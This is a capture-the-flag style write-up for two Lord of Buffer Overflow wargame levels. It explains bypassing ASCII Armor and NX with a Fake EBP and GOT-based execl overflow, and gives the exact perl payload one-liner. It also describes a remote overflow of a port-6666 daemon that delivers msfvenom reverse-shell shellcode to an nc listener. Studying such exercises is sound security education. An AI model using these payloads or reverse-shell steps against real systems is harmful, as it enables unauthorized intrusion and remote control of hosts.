---
title: "Lord of Buffer Overflow (LOB) Wargame: Gate → Iron_golem → Dark_eyes"
date: 2019-06-01
description: "LOB (Lord of Buffer Overflow) wargame progression: Gate (basic BOF), Iron_golem (partial RELRO bypass), Dark_eyes (NX + ASLR), demonstrating Linux exploitation technique evolution"
tags: ["LOB", "pwn", "buffer-overflow", "ASLR", "NX", "RELRO", "GOT-overwrite", "wargame"]
platform: "wargame"
category: "pwn"
difficulty: "medium"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Environment: Fedora Core 3

LOB on Fedora Core 3 introduces a meaningful set of mitigations compared to earlier environments. Understanding what is and is not active is the first step before attempting any exploit.

| Protection | Status |
|---|---|
| Stack dummy | Enabled |
| Bash privilege downgrade | Enabled |
| ASLR (stack only) | Enabled |
| ASLR (library) | Disabled |
| ASLR (binary) | Disabled |
| ASCII Armor | Enabled |
| NX (stack) | Enabled |
| NX (heap) | Enabled |
| Stack Canary | Disabled |
| Stack Smashing Protector | Disabled |

The critical combination is: **NX on stack and heap** plus **ASCII Armor on shared libraries**.

ASCII Armor ensures that all shared library base addresses fall below `0x01000000`, meaning their most-significant byte is always `\x00`. Any payload that needs to embed a library address will be truncated by `strcpy` or similar string functions — a direct RTL (Return-to-Library) attack using `system("/bin/sh")` is blocked because the address cannot survive a string copy.

The stack can be read and written but not executed:

```
08048000-08049000 r-xp  /usr/local/bin/iron_golem  (text)
08049000-0804a000 rwxp  /usr/local/bin/iron_golem  (data/bss)
bffeb000-c0000000 rwxp  [stack]   <- no execute bit
```

## Level: Gate → Iron_golem

### Source Analysis

The iron_golem binary is structurally simple — a `strcpy` into a fixed-size buffer with no length check:

```c
char buffer[256];
strcpy(buffer, argv[1]);
```

The compiler allocates `0x108` (264) bytes on the stack for this frame:

- 256 bytes: the user buffer
- 8 bytes: compiler-inserted dummy / alignment padding

Stack layout:

```
[buffer 256B][dummy 8B][SFP 4B][RET 4B][argc][argv][envp]
```

Overflow offset to SFP: 264 bytes. Overflow offset to RET: 268 bytes.

### Why Direct RTL Fails

The natural approach would be to overwrite RET with the address of `system()` from libc. But with ASCII Armor active, libc is mapped somewhere like `0x00d4xxxx`. The leading `\x00` terminates any `strcpy`-based overflow before the full address is written.

### Fake EBP + GOT-based execl

The solution uses two primitives together:

**Fake EBP** exploits the function epilogue. The `leave` instruction executes `mov esp, ebp; pop ebp`, restoring EBP from the current stack. By controlling what value gets popped into EBP, we influence where the *next* epilogue's `leave` pivots the stack — effectively redirecting execution through a chosen memory region.

**GOT dereferencing** avoids the ASCII Armor problem. The Global Offset Table (GOT) is mapped in the binary's own address space (around `0x08049xxx`), which has no null-byte issue. The GOT entry for `execl` contains the resolved library address — we do not need to embed that address in our payload; we need only point the instruction pointer at the GOT entry, and the CPU will indirect through it automatically.

### Exploit Construction

First, identify the PLT and GOT addresses:

```
GOT base: 0x8049618
execl GOT entry: 0x804954c  ->  (points to execl in libc)
```

Because `execl` also has a prologue (`push ebp; mov ebp, esp`), jumping to its very first instruction would overwrite EBP again and break the Fake EBP chain. The workaround is to jump to `execl + 3`, skipping the prologue.

The first argument to `execl` is read from wherever ESP points after the pivot. By arranging the Fake EBP to land at `0x8049618` (the GOT base), the resolved `execl` address is used as the path argument — it becomes the filename that execl tries to execute.

We pre-create a file named `\x01` (the byte value stored at that GOT location) in the working directory:

```c
// shell.c
#include <stdlib.h>
int main() { system("/bin/sh"); return 0; }
```

```bash
gcc -o shell shell.c
mv shell $'\x01'
```

The area 8 bytes before the GOT base (`0x8049610`) happens to be zeroed, which satisfies the null terminator requirements for the remaining `execl` arguments.

Final payload:

```bash
./iron_golem $(perl -e 'print "\x90"x264, "\x10\x96\x04\x08", "\x23\x57\x7a"')
```

Breakdown:

| Component | Bytes | Purpose |
|---|---|---|
| `\x90` * 264 | 264 | Fill buffer and dummy |
| `\x10\x96\x04\x08` | 4 | Fake EBP → GOT base |
| `\x23\x57\x7a` | 3 | RET → execl+3 |

The `\x7a5723` address is `execl + 3` in this build. Running the payload spawns a shell through the `\x01` stub, giving iron_golem's privileges.

## Level: Iron_golem → Dark_eyes

### Source Analysis

dark_eyes runs as a network daemon listening on port 6666:

```c
recv(client_fd, buffer, 256, 0);
```

The buffer is declared as `char buffer[40]` but `recv` is allowed to write 256 bytes — a 216-byte overflow. Unlike the previous level, this exploit must be delivered over a TCP connection.

### Remote Exploitation: Reverse Shell

The challenge with network exploitation is that stdin/stdout are not connected to the attacker's terminal; they are connected to the socket. A bind shell (listening on the victim) or a reverse shell (connecting back to the attacker) is needed.

I used a reverse shell approach:

1. Generate shellcode using msfvenom targeting the victim architecture:

   ```
   Payload: linux/x86/shell_reverse_tcp
   LHOST:   <attacker IP>
   LPORT:   <chosen port>
   Format:  python
   ```

2. Craft the buffer overflow payload with the shellcode embedded in the NOP sled and the return address pointing into the buffer.

3. On the attacker machine, open a listener:

   ```bash
   nc -lvnp <LPORT>
   ```

4. Send the payload to port 6666 on the victim.

Why a reverse shell rather than a bind shell? Firewalls typically allow outbound connections from internal hosts while blocking unsolicited inbound connections. A reverse shell has the victim initiate the connection outbound, which is usually permitted.

```
attacker (nc -l) <--- TCP connect --- victim (dark_eyes daemon)
```

The shellcode instructs the victim to call back to the attacker's IP and port, where netcat is already listening. Once the connection is established, the attacker has an interactive shell running with the privileges of the daemon process.

### Why ASCII Armor Does Not Block This

NX was the primary concern here, not ASCII Armor. Since the exploit uses a shellcode payload rather than RTL, the shellcode must be placed in executable memory. However, if the stack and heap are both non-executable, this approach should fail — unless the shellcode can be placed in a writable+executable region.

In the FC3 environment, the `mmap`ed region for libraries is not universally marked non-executable. Some builds leave a usable window. If NX is enforced everywhere, the correct escalation is to a full ROP chain, which the next levels of LOB address.

## Progression Summary

| Level | Key Technique | Blocker Bypassed |
|---|---|---|
| Gate → Iron_golem | Fake EBP + GOT-based execl | ASCII Armor (NX + null-byte in library addresses) |
| Iron_golem → Dark_eyes | Remote BOF + reverse shellcode | Network socket I/O, outbound firewall |

The progression illustrates how each added mitigation forces a technique upgrade. NX alone does not stop a determined attacker on this environment — it requires combining NX with full ASLR (covering both libraries and the binary) to make ROP impractical without an information leak.
